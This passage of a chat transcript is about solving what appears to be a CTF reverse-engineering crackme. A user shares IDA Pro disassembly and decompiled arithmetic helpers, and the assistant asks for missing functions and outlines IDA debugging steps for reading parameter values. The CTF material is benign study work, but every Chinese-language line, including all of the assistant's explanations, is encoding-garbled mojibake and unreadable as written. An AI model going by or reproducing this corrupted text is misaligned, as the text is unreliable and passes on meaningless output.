.text:004122F8                 imul    ecx, eax, 0
.text:004122FB                 cmp     [ebp+ecx+var_84], 118263A7h
.text:00412306                 jnz     short loc_41232C
.text:00412308                 mov     eax, 4
.text:0041230D                 shl     eax, 0
.text:00412310                 cmp     [ebp+eax+var_84], 7C85D629h
.text:0041231B                 jnz     short loc_41232C
.text:0041231D                 push    offset aYouAreRight ; "You are right!"
.text:00412322                 call    sub_4110E6
.text:00412327                 add     esp, 4
.text:0041232A                 jmp     short loc_412339
.text:0041232C ; ---------------------------------------------------------------------------
.text:0041232C
.text:0041232C loc_41232C:                             ; CODE XREF: sub_411FE0+2AFâ†‘j
.text:0041232C                                         ; sub_411FE0+2C5â†‘j ...
.text:0041232C                 push    offset aNoItSWrong ; "No  it's  wrong"
.text:00412331                 call    sub_4110E6
.text:00412336                 add     esp, 4
.text:00412339
.text:00412339 loc_412339:                             ; CODE XREF: sub_411FE0+34Aâ†‘j
.text:00412339                 xor     eax, eax
.text:0041233B
.text:0041233B loc_41233B:                             ; CODE XREF: sub_411FE0+94â†‘j
.text:0041233B                                         ; sub_411FE0+F9â†‘j
.text:0041233B                 push    edx
.text:0041233C                 mov     ecx, ebp
.text:0041233E                 push    eax
.text:0041233F                 lea     edx, dword_41236C
.text:00412345                 call    sub_411217
.text:0041234A                 pop     eax
.text:0041234B                 pop     edx
.text:0041234C                 pop     edi
.text:0041234D                 pop     esi
.text:0041234E                 pop     ebx
.text:0041234F                 mov     ecx, [ebp+var_4]
.text:00412352                 xor     ecx, ebp        ; StackCookie
.text:00412354                 call    j_@__security_check_cookie@4 ; __security_check_cookie(x)
.text:00412359                 add     esp, 154h
.text:0041235F                 cmp     ebp, esp
.text:00412361                 call    sub_41127B
.text:00412366                 mov     esp, ebp
.text:00412368                 pop     ebp
.text:00412369                 retn
.text:00412369 sub_411FE0      endp
.text:00412369
.text:00412369 ; ---------------------------------------------------------------------------
.text:0041236A                 align 4
.text:0041236C dword_41236C    dd 6                    ; DATA XREF: sub_411FE0+35Fâ†‘o
.text:00412370                 dd offset dword_412374
.text:00412374 dword_412374    dd 0FFFFFFE8h, 10h      ; DATA XREF: .text:00412370â†‘o
.text:0041237C                 dd offset aK            ; "k"
.text:00412380                 dd 0FFFFFFBCh, 21h
.text:00412388                 dd offset aInputBuffer  ; "input_buffer"
.text:0041238C                 dd 0FFFFFFACh, 8
.text:00412394                 dd offset byte_4123C5
.text:00412398                 dd 0FFFFFF9Ch, 8
.text:004123A0                 dd offset word_4123C2
.text:004123A4                 dd 0FFFFFF8Ch, 8
.text:004123AC                 dd offset byte_4123BF
.text:004123B0                 dd 0FFFFFF7Ch, 8
.text:004123B8                 dd offset byte_4123BC
.text:004123BC byte_4123BC     db 76h, 34h, 0          ; DATA XREF: .text:004123B8â†‘o
.text:004123BF byte_4123BF     db 76h                  ; DATA XREF: .text:004123ACâ†‘o
.text:004123C0                 db 33h, 0
.text:004123C2 word_4123C2     dw 3276h                ; DATA XREF: .text:004123A0â†‘o
.text:004123C4                 db 0
.text:004123C5 byte_4123C5     db 76h, 31h, 0          ; DATA XREF: .text:00412394â†‘o
.text:004123C8 aInputBuffer    db 'input_buffer',0     ; DATA XREF: .text:00412388â†‘o
.text:004123D5 aK              db 'k',0                ; DATA XREF: .text:0041237Câ†‘o
.text:004123D7                 db 109h dup(0CCh)

éœ€è¦ä»€ä¹ˆæ²¡æœ‰ç»™å‡ºçš„å‡½æ•°å®ç°æˆ–å˜é‡çš„å€¼è¯·è¯¢é—®æˆ‘ï¼Œä¸è¦çŒœæµ‹
```

A:

```
æ ¹æ®æä¾›çš„æ±‡ç¼–ä»£ç ï¼Œæˆ‘åˆ†æäº†è¿™ä¸ªCTFçš„Reverseé¢˜ã€‚ä»£ç çš„ä¸»è¦é€»è¾‘æ˜¯è¯»å–ç”¨æˆ·è¾“å…¥ï¼Œå°†å…¶åˆ†æˆ4ä¸ª8å­—èŠ‚å—ï¼Œç„¶åé€šè¿‡ä¸€ç³»åˆ—å‡½æ•°è°ƒç”¨å¤„ç†è¿™äº›å—ï¼Œæœ€åä¸ç¡¬ç¼–ç å€¼æ¯”è¾ƒã€‚å…³é”®ç‚¹åœ¨äºç†è§£è¿™äº›å¤„ç†å‡½æ•°çš„è¡Œä¸ºï¼Œä»¥ä¾¿é€†å‘æ¨å¯¼å‡ºæ­£ç¡®çš„è¾“å…¥ã€‚

ä»ä»£ç ä¸­ï¼Œæˆ‘çœ‹åˆ°ä»¥ä¸‹å…³é”®å‡½æ•°è¢«è°ƒç”¨ï¼š

åœ¨åœ°å€ 0x0041222B è°ƒç”¨çš„å‡½æ•°ï¼Œç”± [esp+2CCh+var_188] æŒ‡å‘ã€‚

åœ¨åœ°å€ 0x0041223Bã€0x0041224Eã€0x00412261ã€0x00412277 è°ƒç”¨çš„å‡½æ•°ï¼Œç”± [ebp+var_18C] æŒ‡å‘ã€‚

è¿™äº›å‡½æ•°è´Ÿè´£å¤„ç†è¾“å…¥å—ï¼Œä½†å®ƒä»¬çš„å®ç°æ²¡æœ‰åœ¨æä¾›çš„ä»£ç ä¸­ç»™å‡ºã€‚ä¸ºäº†ç¼–å†™è§£å¯†è„šæœ¬ï¼Œæˆ‘éœ€è¦çŸ¥é“è¿™äº›å‡½æ•°çš„å…·ä½“å®ç°ã€‚æ­¤å¤–ï¼Œvar_18 æ•°ç»„ï¼ˆåˆå§‹å€¼ä¸º [1, 2, 3, 4]ï¼‰å¯èƒ½åœ¨å¤„ç†è¿‡ç¨‹ä¸­è¢«ä¿®æ”¹ï¼Œå› æ­¤ä¹Ÿéœ€è¦äº†è§£è¿™äº›å‡½æ•°å¦‚ä½•å½±å“å®ƒã€‚

è¯·æä¾›ä»¥ä¸‹ä¿¡æ¯ï¼š

å‡½æ•° [esp+2CCh+var_188] çš„å®ç°ï¼ˆåœ¨ 0x0041222B è°ƒç”¨ï¼‰ã€‚

å‡½æ•° [ebp+var_18C] çš„å®ç°ï¼ˆåœ¨ 0x0041223B ç­‰å¤„è°ƒç”¨ï¼‰ã€‚

å¦‚æœè¿™äº›å‡½æ•°ä¾èµ–å…¶ä»–å…¨å±€å˜é‡æˆ–çŠ¶æ€ï¼Œä¹Ÿè¯·æä¾›ç›¸å…³ç»†èŠ‚ã€‚

æœ‰äº†è¿™äº›å‡½æ•°çš„ä»£ç ï¼Œæˆ‘å¯ä»¥é€†å‘å¤„ç†è¿‡ç¨‹ï¼Œä»ç¡¬ç¼–ç å€¼æ¨å¯¼å‡ºåŸå§‹è¾“å…¥å­—ç¬¦ä¸²ã€‚
```

Q

```
å‡½æ•° [esp+2CCh+var_188]è°ƒç”¨äº†è¿™ä¸ª

.text:001D1C30 ; int sub_1D1C30()
.text:001D1C30 sub_1D1C30 proc near
.text:001D1C30
.text:001D1C30 arg_120= dword ptr  128h
.text:001D1C30 arg_124= dword ptr  12Ch
.text:001D1C30 arg_130= dword ptr  138h
.text:001D1C30 arg_134= dword ptr  13Ch
.text:001D1C30 arg_14C= dword ptr  154h
.text:001D1C30 arg_158= dword ptr  160h
.text:001D1C30
.text:001D1C30 push    ebp
.text:001D1C31 mov     ebp, esp
.text:001D1C33 sub     esp, 0C0h
.text:001D1C39 push    ebx
.text:001D1C3A push    esi
.text:001D1C3B push    edi
.text:001D1C3C mov     edi, ebp
.text:001D1C3E xor     ecx, ecx
.text:001D1C40 mov     eax, 0CCCCCCCCh
.text:001D1C45 rep stosd
.text:001D1C47 mov     eax, [ebp+arg_120]
.text:001D1C4D mov     ecx, [ebp+arg_124]
.text:001D1C53 push    eax
.text:001D1C54 push    ecx
.text:001D1C55 mov     edx, ebp
.text:001D1C57 mov     eax, [edx+154h]
.text:001D1C5D call    eax
.text:001D1C5F push    eax
.text:001D1C60 mov     ecx, [ebp+arg_130]
.text:001D1C66 push    ecx
.text:001D1C67 mov     eax, [ebp+arg_158]
.text:001D1C6D call    eax
.text:001D1C6F mov     edx, eax
.text:001D1C71 mov     eax, [ebp+arg_134]
.text:001D1C77 push    eax
.text:001D1C78 push    edx
.text:001D1C79 mov     eax, [ebp+arg_158]
.text:001D1C7F call    eax
.text:001D1C81 mov     ecx, eax
.text:001D1C83 push    ecx
.text:001D1C84 push    eax
.text:001D1C85 mov     edx, [ebp+arg_14C]
.text:001D1C8B call    edx
.text:001D1C8D mov     dword_1DB198, eax
.text:001D1C92 add     esp, 20h
.text:001D1C95 xor     eax, eax
.text:001D1C97 pop     edi
.text:001D1C98 pop     esi
.text:001D1C99 pop     ebx
.text:001D1C9A add     esp, 0C0h
.text:001D1CA0 cmp     ebp, esp
.text:001D1CA2 call    sub_1D127B
.text:001D1CA7 mov     esp, ebp
.text:001D1CA9 pop     ebp
.text:001D1CAA retn
.text:001D1CAA sub_1D1C30 endp
.text:001D1CAA

[ebp+var_18C]è°ƒç”¨äº†è¿™ä¸ª
.text:001D1920 sub_1D1920 proc near                    ; CODE XREF: sub_1D1014â†‘j
.text:001D1920
.text:001D1920 var_7C= byte ptr -7Ch
.text:001D1920 var_78= dword ptr -78h
.text:001D1920 var_6C= dword ptr -6Ch
.text:001D1920 var_60= dword ptr -60h
.text:001D1920 var_54= dword ptr -54h
.text:001D1920 var_48= dword ptr -48h
.text:001D1920 var_3C= dword ptr -3Ch
.text:001D1920 var_30= dword ptr -30h
.text:001D1920 var_24= dword ptr -24h
.text:001D1920 var_18= dword ptr -18h
.text:001D1920 var_C= dword ptr -0Ch
.text:001D1920 var_4= dword ptr -4
.text:001D1920 arg_0= dword ptr  8
.text:001D1920 arg_4= dword ptr  0Ch
.text:001D1920 arg_C8= dword ptr  0D0h
.text:001D1920 arg_100= dword ptr  108h
.text:001D1920 arg_104= dword ptr  10Ch
.text:001D1920 arg_108= dword ptr  110h
.text:001D1920 arg_10C= dword ptr  114h
.text:001D1920 arg_110= dword ptr  118h
.text:001D1920 arg_114= dword ptr  11Ch
.text:001D1920 arg_118= dword ptr  120h
.text:001D1920 arg_11C= dword ptr  124h
.text:001D1920 arg_130= dword ptr  138h
.text:001D1920 arg_134= dword ptr  13Ch
.text:001D1920 arg_144= dword ptr  14Ch
.text:001D1920 arg_15C= dword ptr  164h
.text:001D1920 arg_160= dword ptr  168h
.text:001D1920 arg_168= dword ptr  170h
.text:001D1920 arg_170= dword ptr  178h
.text:001D1920
.text:001D1920 push    ebp
.text:001D1921 mov     ebp, esp
.text:001D1923 sub     esp, 13Ch
.text:001D1929 push    ebx
.text:001D192A push    esi
.text:001D192B push    edi
.text:001D192C lea     edi, [ebp+var_7C]
.text:001D192F mov     ecx, 1Fh
.text:001D1934 mov     eax, 0CCCCCCCCh
.text:001D1939 rep stosd
.text:001D193B mov     eax, ___security_cookie
.text:001D1940 xor     eax, ebp
.text:001D1942 mov     [ebp+var_4], eax
.text:001D1945 mov     eax, 4
.text:001D194A imul    ecx, eax, 0
.text:001D194D mov     edx, [ebp+arg_0]
.text:001D1950 mov     eax, [edx+ecx]
.text:001D1953 mov     [ebp+var_C], eax
.text:001D1956 mov     eax, 4
.text:001D195B shl     eax, 0
.text:001D195E mov     ecx, [ebp+arg_0]
.text:001D1961 mov     edx, [ecx+eax]
.text:001D1964 mov     [ebp+var_18], edx
.text:001D1967 mov     [ebp+var_24], 0
.text:001D196E mov     eax, 4
.text:001D1973 imul    ecx, eax, 0
.text:001D1976 mov     edx, [ebp+arg_4]
.text:001D1979 mov     eax, [edx+ecx]
.text:001D197C mov     [ebp+var_3C], eax
.text:001D197F mov     eax, 4
.text:001D1984 shl     eax, 0
.text:001D1987 mov     ecx, [ebp+arg_4]
.text:001D198A mov     edx, [ecx+eax]
.text:001D198D mov     [ebp+var_48], edx
.text:001D1990 mov     eax, 4
.text:001D1995 shl     eax, 1
.text:001D1997 mov     ecx, [ebp+arg_4]
.text:001D199A mov     edx, [ecx+eax]
.text:001D199D mov     [ebp+var_54], edx
.text:001D19A0 mov     eax, 4
.text:001D19A5 imul    ecx, eax, 3
.text:001D19A8 mov     edx, [ebp+arg_4]
.text:001D19AB mov     eax, [edx+ecx]
.text:001D19AE mov     [ebp+var_60], eax
.text:001D19B1 mov     [ebp+var_78], 1
.text:001D19B8 mov     eax, [ebp+arg_144]
.text:001D19BE mov     [ebp+var_30], eax
.text:001D19C1
.text:001D19C1 loc_1D19C1:                             ; CODE XREF: sub_1D1920+224â†“j
.text:001D19C1 cmp     [ebp+var_78], 0
.text:001D19C5 jz      loc_1D1B49
.text:001D19CB
.text:001D19CB loc_1D19CB:                             ; CODE XREF: sub_1D1920+212â†“j
.text:001D19CB mov     eax, [ebp+arg_0]
.text:001D19CE mov     [ebp+arg_11C], eax
.text:001D19D4 mov     eax, [ebp+arg_0+1]
.text:001D19D7 mov     [ebp+arg_118], eax
.text:001D19DD mov     eax, [ebp+var_24]
.text:001D19E0 mov     [ebp+arg_114], eax
.text:001D19E6 mov     eax, [ebp+arg_4]
.text:001D19E9 mov     [ebp+arg_110], eax
.text:001D19EF mov     eax, [ebp+arg_4+1]
.text:001D19F2 mov     [ebp+arg_10C], eax
.text:001D19F8 mov     eax, [ebp+arg_4+2]
.text:001D19FB mov     [ebp+arg_108], eax
.text:001D1A01 mov     eax, [ebp+arg_4+3]
.text:001D1A04 mov     [ebp+arg_104], eax
.text:001D1A0A mov     eax, dword_1DB198
.text:001D1A0F mov     [ebp+arg_100], eax
.text:001D1A15 mov     eax, [ebp+arg_114]
.text:001D1A1B push    eax
.text:001D1A1C mov     eax, [ebp+arg_100]
.text:001D1A22 push    eax
.text:001D1A23 mov     eax, [ebp+arg_170]
.text:001D1A29 call    eax
.text:001D1A2B mov     [ebp+var_24], eax
.text:001D1A2E mov     eax, [ebp+arg_134]
.text:001D1A34 push    eax
.text:001D1A35 push    [ebp+var_18]
.text:001D1A38 mov     eax, [ebp+arg_160]
.text:001D1A3E call    eax
.text:001D1A40 push    eax
.text:001D1A41 push    [ebp+var_3C]
.text:001D1A44 mov     eax, [ebp+arg_170]
.text:001D1A4A call    eax
.text:001D1A4C mov     [ebp+var_6C], eax
.text:001D1A4F push    [ebp+var_18]
.text:001D1A52 push    [ebp+var_24]
.text:001D1A55 mov     eax, [ebp+arg_170]
.text:001D1A5B call    eax
.text:001D1A5D push    [ebp+var_6C]
.text:001D1A60 push    eax
.text:001D1A61 mov     eax, [ebp+arg_168]
.text:001D1A67 call    eax
.text:001D1A69 mov     [ebp+var_6C], eax
.text:001D1A6C mov     eax, [ebp+arg_130]
.text:001D1A72 push    eax
.text:001D1A73 push    [ebp+var_18]
.text:001D1A76 mov     eax, [ebp+arg_15C]
.text:001D1A7C call    eax
.text:001D1A7E push    eax
.text:001D1A7F push    [ebp+var_48]
.text:001D1A82 mov     eax, [ebp+arg_170]
.text:001D1A88 call    eax
.text:001D1A8A push    eax
.text:001D1A8B push    [ebp+var_6C]
.text:001D1A8E mov     eax, [ebp+arg_168]
.text:001D1A94 call    eax
.text:001D1A96 push    eax
.text:001D1A97 push    [ebp+var_C]
.text:001D1A9A mov     eax, [ebp+arg_170]
.text:001D1AA0 call    eax
.text:001D1AA2 mov     [ebp+var_C], eax
.text:001D1AA5 mov     eax, [ebp+arg_134]
.text:001D1AAB push    eax
.text:001D1AAC push    [ebp+var_C]
.text:001D1AAF mov     eax, [ebp+arg_160]
.text:001D1AB5 call    eax
.text:001D1AB7 push    eax
.text:001D1AB8 push    [ebp+var_54]
.text:001D1ABB mov     eax, [ebp+arg_170]
.text:001D1AC1 call    eax
.text:001D1AC3 mov     [ebp+var_6C], eax
.text:001D1AC6 push    [ebp+var_C]
.text:001D1AC9 push    [ebp+var_24]
.text:001D1ACC mov     eax, [ebp+arg_170]
.text:001D1AD2 call    eax
.text:001D1AD4 push    [ebp+var_6C]
.text:001D1AD7 push    eax
.text:001D1AD8 mov     eax, [ebp+arg_168]
.text:001D1ADE call    eax
.text:001D1AE0 mov     [ebp+var_6C], eax
.text:001D1AE3 mov     eax, [ebp+arg_130]
.text:001D1AE9 push    eax
.text:001D1AEA push    [ebp+var_C]
.text:001D1AED mov     eax, [ebp+arg_15C]
.text:001D1AF3 call    eax
.text:001D1AF5 push    eax
.text:001D1AF6 push    [ebp+var_60]
.text:001D1AF9 mov     eax, [ebp+arg_170]
.text:001D1AFF call    eax
.text:001D1B01 push    eax
.text:001D1B02 push    [ebp+var_6C]
.text:001D1B05 mov     eax, [ebp+arg_168]
.text:001D1B0B call    eax
.text:001D1B0D push    eax
.text:001D1B0E push    [ebp+var_18]
.text:001D1B11 mov     eax, [ebp+arg_170]
.text:001D1B17 call    eax
.text:001D1B19 mov     [ebp+var_18], eax
.text:001D1B1C mov     eax, [ebp+arg_C8]
.text:001D1B22 mov     ecx, [ebp+var_30]
.text:001D1B25 cmp     ecx, eax
.text:001D1B27 jge     short loc_1D1B37
.text:001D1B29 inc     [ebp+var_30]
.text:001D1B2C add     esp, 88h
.text:001D1B32 jmp     loc_1D19CB
.text:001D1B37 ; ---------------------------------------------------------------------------
.text:001D1B37
.text:001D1B37 loc_1D1B37:                             ; CODE XREF: sub_1D1920+207â†‘j
.text:001D1B37 mov     [ebp+var_78], 0
.text:001D1B3E add     esp, 88h
.text:001D1B44 jmp     loc_1D19C1
.text:001D1B49 ; ---------------------------------------------------------------------------
.text:001D1B49
.text:001D1B49 loc_1D1B49:                             ; CODE XREF: sub_1D1920+A5â†‘j
.text:001D1B49 mov     eax, 4
.text:001D1B4E imul    ecx, eax, 0
.text:001D1B51 mov     edx, [ebp+arg_0]
.text:001D1B54 mov     eax, [ebp+var_C]
.text:001D1B57 mov     [edx+ecx], eax
.text:001D1B5A mov     eax, 4
.text:001D1B5F shl     eax, 0
.text:001D1B62 mov     ecx, [ebp+arg_0]
.text:001D1B65 mov     edx, [ebp+var_18]
.text:001D1B68 mov     [ecx+eax], edx
.text:001D1B6B xor     eax, eax
.text:001D1B6D pop     edi
.text:001D1B6E pop     esi
.text:001D1B6F pop     ebx
.text:001D1B70 mov     ecx, [ebp+var_4]
.text:001D1B73 xor     ecx, ebp                        ; StackCookie
.text:001D1B75 call    j_@__security_check_cookie@4    ; __security_check_cookie(x)
.text:001D1B7A add     esp, 13Ch
.text:001D1B80 cmp     ebp, esp
.text:001D1B82 call    sub_1D127B
.text:001D1B87 mov     esp, ebp
.text:001D1B89 pop     ebp
.text:001D1B8A retn
.text:001D1B8A sub_1D1920 endp
```

A:

```
æ ¹æ®æä¾›çš„ä»£ç åˆ†æï¼Œè¿™ä¸ªCTFçš„Reverseé¢˜æ¶‰åŠä¸€ä¸ªè‡ªå®šä¹‰çš„åŠ å¯†ç®—æ³•ï¼Œä¸»è¦å‡½æ•°æ˜¯sub_1D1920å’Œsub_1D1C30ã€‚ä»ä¸»å‡½æ•°ï¼ˆsub_411FE0ï¼‰æ¥çœ‹ï¼Œè¾“å…¥è¢«åˆ†æˆ4ä¸ª8å­—èŠ‚å—ï¼Œæ¯ä¸ªå—é€šè¿‡sub_1D1920å¤„ç†ï¼Œæœ€åä¸ç¡¬ç¼–ç å€¼æ¯”è¾ƒã€‚ç„¶è€Œï¼Œsub_1D1920å’Œsub_1D1C30ä¾èµ–äºå¤šä¸ªå‡½æ•°æŒ‡é’ˆï¼ˆå¦‚arg_170ã€arg_168ç­‰ï¼‰ï¼Œè¿™äº›å‡½æ•°æŒ‡é’ˆçš„å…·ä½“å®ç°æ²¡æœ‰æä¾›ï¼Œå› æ­¤æ— æ³•å‡†ç¡®è¿˜åŸåŠ å¯†ç®—æ³•ã€‚

ä¸ºäº†ç¼–å†™è§£å¯†è„šæœ¬ï¼Œæˆ‘éœ€è¦ä»¥ä¸‹æœªæä¾›çš„å‡½æ•°å®ç°ï¼š

sub_1D1920ä¸­ä½¿ç”¨çš„å‡½æ•°æŒ‡é’ˆï¼š

arg_170 åœ¨åœ°å€ 0x001D1A29ã€0x001D1A4Aã€0x001D1A5B ç­‰å¤„è°ƒç”¨ã€‚

arg_168 åœ¨åœ°å€ 0x001D1A67ã€0x001D1A94ã€0x001D1B0B ç­‰å¤„è°ƒç”¨ã€‚

arg_160 åœ¨åœ°å€ 0x001D1A3Eã€0x001D1AB5 ç­‰å¤„è°ƒç”¨ã€‚

arg_15C åœ¨åœ°å€ 0x001D1A7Cã€0x001D1AF3 ç­‰å¤„è°ƒç”¨ã€‚

ä»¥åŠå…¶ä»–å‚æ•°å¦‚ arg_130ã€arg_134 ç­‰å¯¹åº”çš„å‡½æ•°ã€‚

sub_1D1C30ä¸­ä½¿ç”¨çš„å‡½æ•°æŒ‡é’ˆï¼š

åœ¨åœ°å€ 0x001D1C5Dã€0x001D1C6Dã€0x001D1C7Fã€0x001D1C8B å¤„è°ƒç”¨çš„å‡½æ•°ã€‚

ä¸»å‡½æ•°ä¸­å‹å…¥çš„å‡½æ•°åœ°å€ï¼ˆå¦‚ sub_41109Bã€sub_4113F2 ç­‰ï¼‰çš„å®ç°ï¼Œè¿™äº›å‡½æ•°å¯èƒ½ç”¨äºåˆå§‹åŒ–æˆ–è®¡ç®—ã€‚

å¦‚æœæ²¡æœ‰è¿™äº›å‡½æ•°çš„ä»£ç ï¼Œæˆ‘æ— æ³•å‡†ç¡®é€†å‘åŠ å¯†è¿‡ç¨‹ã€‚è¯·æä¾›è¿™äº›å‡½æ•°çš„å®ç°ï¼Œä»¥ä¾¿æˆ‘ç»§ç»­åˆ†æå¹¶ç¼–å†™è§£å¯†è„šæœ¬ã€‚

å¦‚æœæ‚¨æ— æ³•æä¾›è¿™äº›å‡½æ•°ï¼Œæˆ‘å¯ä»¥åŸºäºå¸¸è§ç®—æ³•ï¼ˆå¦‚TEAæˆ–XTEAï¼‰ç»™å‡ºä¸€ä¸ªçŒœæµ‹æ€§çš„è§£å¯†è„šæœ¬ï¼Œä½†è¯·æ³¨æ„è¿™å¯èƒ½ä¸å‡†ç¡®ã€‚
```

Q:

```
0x001D1C5Dè°ƒç”¨
int __cdecl sub_1D1D20(int a1, int a2)
{
  sub_1D136B(&unk_1DD015);
  return a2 * a1;
}
// attributes: thunk
int __thiscall sub_1D136B(void *this)
{
  return sub_1D2B90(this);
}
DWORD __thiscall sub_1D2B90(_BYTE *this)
{
  DWORD result; // eax

  result = (DWORD)this;
  if ( *this )
  {
    if ( dword_1DB5FC )
      return GetCurrentThreadId();
  }
  return result;
}

0x001D1C6Dè°ƒç”¨
int __cdecl sub_1D1DC0(int a1, char a2)
{
  sub_1D136B(&unk_1DD015);
  return a1 << a2;
}

0x001D1C7Fè°ƒç”¨
int __cdecl sub_1D1DC0(int a1, char a2)
{
  sub_1D136B(&unk_1DD015);
  return a1 << a2;
}

0x001D1C8Bè°ƒç”¨
int __cdecl sub_1D1D20(int a1, int a2)
{
  sub_1D136B(&unk_1DD015);
  return a2 * a1;
}

// attributes: thunk
int __cdecl sub_1D1307(int a1, int a2)
{
  return sub_1D1830(a1, a2);
}
int __cdecl sub_1D1830(int a1, int a2)
{
  sub_1D136B(&unk_1DD015);
  return a2 + a1;
}
// attributes: thunk
int __cdecl sub_1D109B(int a1, int a2)
{
  return sub_1D1E60(a1, a2);
}
int __cdecl sub_1D1E60(int a1, int a2)
{
  sub_1D136B(&unk_1DD015);
  return a1 - a2;
}
// attributes: thunk
int __cdecl sub_1D13F2(int a1, int a2)
{
  return sub_1D1EB0(a1, a2);
}
int __cdecl sub_1D1EB0(int a1, int a2)
{
  sub_1D136B(&unk_1DD015);
  return a2 ^ a1;
}

ä¸‹ä¸€æ­¥éœ€è¦å“ªäº›å‡½æ•°ï¼Ÿ
```

A:

```
æ ¹æ®æä¾›çš„ä»£ç å’Œåˆ†æï¼Œæˆ‘æ— æ³•ç›´æ¥ä»ä»£ç ä¸­æå–æ‰€æœ‰å¿…è¦çš„å‚æ•°å€¼ï¼ˆå¦‚arg_130ã€arg_134ã€arg_C8ã€arg_144å’Œdeltaï¼‰ï¼Œå› ä¸ºè¿™äº›å€¼åœ¨ä»£ç ä¸­æ²¡æœ‰æ˜ç¡®ç»™å‡ºï¼Œè€Œæ˜¯é€šè¿‡å‡½æ•°æŒ‡é’ˆå’Œå †æ ˆä¼ é€’çš„ã€‚ä¸ºäº†ç¼–å†™è§£å¯†è„šæœ¬ï¼Œæˆ‘éœ€è¦æ‚¨æä¾›ä»¥ä¸‹ä¿¡æ¯ï¼š

sub_1D1920ä¸­çš„å‚æ•°å€¼ï¼š

arg_130çš„å€¼ï¼ˆç”¨äºå‡æ³•æ“ä½œï¼‰ã€‚

arg_134çš„å€¼ï¼ˆç”¨äºå·¦ç§»æ“ä½œï¼‰ã€‚

arg_C8çš„å€¼ï¼ˆå¾ªç¯ç»ˆæ­¢æ¡ä»¶ï¼‰ã€‚

arg_144çš„å€¼ï¼ˆå¾ªç¯èµ·å§‹æ¡ä»¶ï¼‰ã€‚

sub_1D1C30è®¡ç®—å‡ºçš„deltaå€¼ï¼ˆå­˜å‚¨åœ¨dword_1DB198ä¸­ï¼‰ã€‚

è½®æ•°Nï¼Œå³arg_C8 - arg_144ã€‚

å¦‚æœæ‚¨èƒ½æä¾›è¿™äº›å€¼ï¼Œæˆ‘å¯ä»¥ç¼–å†™ä¸€ä¸ªè§£å¯†è„šæœ¬ï¼Œé€†å‘åŠ å¯†è¿‡ç¨‹ï¼Œä»ç»™å®šçš„å¯†æ–‡å—ä¸­æ¢å¤å‡ºåŸå§‹è¾“å…¥ã€‚å¦åˆ™ï¼ŒåŸºäºå½“å‰ä¿¡æ¯ï¼Œæˆ‘åªèƒ½ç»™å‡ºä¸€ä¸ªåŸºäºå‡è®¾çš„è„šæœ¬ï¼ˆå¦‚TEAç®—æ³•ï¼‰ï¼Œä½†å¯èƒ½æ— æ³•æ­£ç¡®è§£å¯†ã€‚

è¯·æä¾›è¿™äº›å€¼ï¼Œä»¥ä¾¿æˆ‘ç»§ç»­ã€‚
```

Q:

```
æˆ‘è¦å¦‚ä½•ç”¨idaåŠ¨æ€è°ƒè¯•è·å–è¿™äº›å€¼ï¼Ÿ
```

A:

```
ä½¿ç”¨IDAåŠ¨æ€è°ƒè¯•è·å–åŠ å¯†å‚æ•°å€¼
è¦é€šè¿‡IDAåŠ¨æ€è°ƒè¯•è·å–è¿™äº›å‚æ•°å€¼ï¼Œè¯·æŒ‰ç…§ä»¥ä¸‹æ­¥éª¤æ“ä½œï¼š

1. å‡†å¤‡è°ƒè¯•ç¯å¢ƒ
æ‰“å¼€IDA Proï¼ŒåŠ è½½ç›®æ ‡å¯æ‰§è¡Œæ–‡ä»¶

åœ¨IDAä¸­è®¾ç½®æ–­ç‚¹ï¼š

åœ¨sub_1D1C30å‡½æ•°å…¥å£å¤„è®¾ç½®æ–­ç‚¹ï¼ˆè·å–deltaå€¼ï¼‰

åœ¨sub_1D1920å‡½æ•°å…¥å£å¤„è®¾ç½®æ–­ç‚¹ï¼ˆè·å–å…¶ä»–å‚æ•°ï¼‰

2. å¯åŠ¨è°ƒè¯•ä¼šè¯
é€‰æ‹©èœå•ï¼šDebugger â†’ Select debugger â†’ Local Windows debugger

é€‰æ‹©èœå•ï¼šDebugger â†’ Start process æˆ–æŒ‰F9å¯åŠ¨è°ƒè¯•

3. è·å–deltaå€¼
å½“ç¨‹åºåœåœ¨sub_1D1C30å‡½æ•°æ—¶ï¼š

å•æ­¥æ‰§è¡Œç›´åˆ°å‡½æ•°ç»“æŸï¼ˆåœ¨0x001D1C8Då¤„ï¼‰

æŸ¥çœ‹dword_1DB198å†…å­˜ä½ç½®çš„å€¼ï¼Œè¿™å°±æ˜¯deltaå€¼

åœ¨IDAä¸­ï¼Œå¯ä»¥é€šè¿‡ä»¥ä¸‹æ–¹å¼æŸ¥çœ‹ï¼š

åœ¨Hex Viewä¸­è½¬åˆ°åœ°å€0x1DB198

æˆ–åœ¨Watch Listä¸­æ·»åŠ dword_1DB198

4. è·å–sub_1D1920çš„å‚æ•°å€¼
å½“ç¨‹åºåœåœ¨sub_1D1920å‡½æ•°å…¥å£æ—¶ï¼š

æŸ¥çœ‹æ ˆå¸§ä»¥è·å–å‚æ•°å€¼ï¼š

arg_130 - åœ¨ebp+138hå¤„

arg_134 - åœ¨ebp+13Chå¤„

arg_C8 - åœ¨ebp+0D0hå¤„

arg_144 - åœ¨ebp+14Chå¤„

åœ¨IDAä¸­æŸ¥çœ‹è¿™äº›å€¼çš„æ–¹æ³•ï¼š

æ‰“å¼€Stack Viewï¼ˆView â†’ Open subviews â†’ Stackï¼‰

æˆ–ä½¿ç”¨å‘½ä»¤åœ¨Output Windowä¸­æ‰“å°ï¼š

text
[ebp+138h]  // arg_130
[ebp+13Ch]  // arg_134
[ebp+0D0h]  // arg_C8
[ebp+14Ch]  // arg_144
5. è®°å½•å…³é”®å€¼
è®°å½•ä»¥ä¸‹å…³é”®ä¿¡æ¯ï¼š

deltaå€¼ï¼ˆä»dword_1DB198ï¼‰

ç§»ä½ä½æ•°ï¼ˆä»arg_130å’Œarg_134ï¼‰

å¾ªç¯è½®æ•°ï¼ˆä»arg_C8å’Œarg_144è®¡ç®—ï¼šarg_C8 - arg_144ï¼‰

6. é‡å¤è°ƒè¯•
ç”±äºå¯èƒ½æœ‰å¤šä¸ªåŠ å¯†è½®æ¬¡ï¼Œå»ºè®®ï¼š

å¤šæ¬¡è¿è¡Œè°ƒè¯•ä¼šè¯

è®°å½•ä¸åŒè½®æ¬¡çš„å‚æ•°å€¼

è§‚å¯Ÿå‚æ•°æ˜¯å¦å˜åŒ–

è·å–è¿™äº›å€¼åï¼Œè¯·æä¾›ç»™æˆ‘ï¼Œæˆ‘å°†ç¼–å†™å®Œæ•´çš„è§£å¯†è„šæœ¬ã€‚
```

Q:

```
dword_1DB198 dd 9000000h 

ebpæŒ‡å‘Stack[00003AC4]:0019FC0C
Stack[00003AC4]:0019FC0D db 0FEh
